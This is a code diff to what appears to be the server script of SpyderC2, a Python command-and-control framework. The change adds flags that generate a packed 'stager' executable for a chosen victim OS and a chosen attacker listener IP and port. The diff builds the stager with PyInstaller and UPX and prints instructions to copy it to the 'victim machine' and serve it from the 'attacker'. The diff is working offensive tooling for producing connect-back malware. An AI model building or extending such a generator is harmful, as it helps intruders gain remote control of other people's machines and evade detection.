@@ -52,7 +52,11 @@ def parser():
 	parser = argparse.ArgumentParser(description='Python based C2')
 	parser.add_argument('-d', '--detached', help = "Doesn't automatically launch logs in another screen.", action='store_true')
 	parser.add_argument('-c', '--clear-db', help = "Clears database when exiting / error occurs", action='store_true')
-	parser.add_argument('-v', '--verbose', help = 'Generates exe', action='store_true')
+	parser.add_argument('-v', '--verbose', help = 'Verbose output', action='store_true')
+	parser.add_argument('-g', '--generate', help = 'Generates stager exe', action='store_true')
+	parser.add_argument('-o', '--os', action='store', type=str, help='Victim OS for generation of stager exe. Options - windows(default), linux.')
+	parser.add_argument('-i', '--ip', action='store', type=str, help='Listener IP for generation of stager exe. Default - 0.0.0.0')
+	parser.add_argument('-p', '--port', action='store', type=str, help='Listener PORT for generation of stager exe. Default - 8080')
 	args = parser.parse_args()
 	return args
 
@@ -91,14 +95,19 @@ def get_victim_os():
 	return (False if input == 'back' else input)
 
 ## Stager.py has needs the server url where it will connect back and copies the new stager to tmp
-def fill_server_url():
-	server_ip = Prompt.ask("Enter listener IP", default='0.0.0.0')
-	while True:
-		server_port = Prompt.ask("Enter listener port", default='8080')
-		if not server_port.isdigit():
-			print("Please enter Port in integer")
-			continue
-		break
+def fill_server_url(args={}):
+	if 'generate' in args and args['generate']:
+		## This is for generting via flags, we take defalt if nothing provided
+		server_ip = args['ip'] if args['ip'] else '0.0.0.0'
+		server_port = args['port'] if args['port'] else '8080'
+	else:
+		server_ip = Prompt.ask("Enter listener IP", default='0.0.0.0')
+		while True:
+			server_port = Prompt.ask("Enter listener port", default='8080')
+			if not server_port.isdigit():
+				print("Please enter Port in integer")
+				continue
+			break
 
 	stager_path = os.path.join(PATH,'stager.py')
 
@@ -188,12 +197,17 @@ def pack_exe(server_logger,exe_path,packer_path):
 
 
 
-def generate_stager(server_logger):
+def generate_stager(server_logger,args={}):
 	
-	os_name = get_victim_os()
+	if 'generate' in args and args['generate']:
+		## This is for generting via flags, we take defalt if nothing provided
+		os_name = args['os'] if args['os'] else 'windows'
+	else:
+		os_name = get_victim_os()
 
-	if not os_name:
-		return
+	if not os_name or os_name not in ['windows','linux']:
+		server_logger.info_log('Not valid OS name, options - windows, linux')
+		return False
 
 	## Convert to exe and save
 	if os.path.exists(os.path.join(PATH,'shared','tmp')):
@@ -207,7 +221,7 @@ def generate_stager(server_logger):
 	if not check_file_existence(PATH,'requirements.txt'): return
 
 	## We fill in the User Provided server URL in tne stager.py and move it to tmp
-	fill_server_url()
+	fill_server_url(args)
 
 	if not check_file_existence(PATH,os.path.join('shared','tmp','stager.py')): return
 
@@ -220,7 +234,8 @@ def generate_stager(server_logger):
 
 
 	## We will attempt to pack the exe
-	exe_path = os.path.join(PATH,'shared','tmp','dist',os_name,'stager.exe')
+	binary_name = 'stager.exe' if os_name == 'windows' else 'stager'
+	exe_path = os.path.join(PATH,'shared','tmp','dist',os_name,binary_name)
 	packer_path = os.path.join(PATH,'utilities','upx','upx')
 	
 	try:
@@ -238,8 +253,11 @@ def generate_stager(server_logger):
 			print(colored(f"\nexe dumped to {colored(f'<path_to_SpyderC2>/data/shared/tmp/dist/{os_name}','cyan')}. Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
 		else:
 			print(colored("\nPlease run the following command: "+ colored('sudo docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-'+os_name + ' && ' + 'sudo ../../utilities/upx/upx ../tmp/dist/'+os_name+'/stager.exe','cyan')+" in "+colored('<path_to_SpyderC2>/data/shared/tmp','blue')+" directory on the host machine.\n The stager will be generated in "+ colored('<path_to_SpyderC2>/data/shared/tmp/dist/'+os_name,'blue')+".\nCopy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe on victim."))
+
+		return True
 	except subprocess.CalledProcessError as grepexc:                                                                                                   
 		print(colored(f"exe generation failed ","red"))
+		return False
 
 
 ## Attempts to kill process running on a port
@@ -394,7 +412,10 @@ if __name__=="__main__":
 	server_logger = Logger(logdir='logs',logfile='logs',verbose=args.verbose )
 	server_logger.setup()
 
-	
+	if args.generate:
+		res = generate_stager(server_logger,vars(args))
+		exit(0) if res else exit(1)
+
 	## launches the log in new screen
 	server_logger.launch_logs_screen(args)
 	
